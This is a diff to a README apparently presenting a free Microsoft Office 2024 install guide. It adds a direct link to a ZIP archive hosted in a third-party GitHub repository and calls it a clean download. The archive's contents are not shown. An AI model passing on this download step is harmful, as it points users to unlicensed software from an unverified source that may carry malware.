@@ -8,7 +8,7 @@ A complete, beginner-friendly guide to install Microsoft Office 2024 for free us
 ## 📦 Installation Steps
 
 ### ✅ Step 1: Download the ZIP File
-- Download the Office 2024 installation package directly as a ZIP file from the provided link.
+- Download the Office 2024 installation package directly as a ZIP file from the [provided link](https://github.com/niyobern/Office2024-FreeInstall-Walkthrough/blob/b07153110149a1d67245c42c9152172f77bc3c55/office%202024.zip).
 - No redirects or third-party installers—just a clean ZIP file ready to extract.
 
 ### 📂 Step 2: Extract the Files
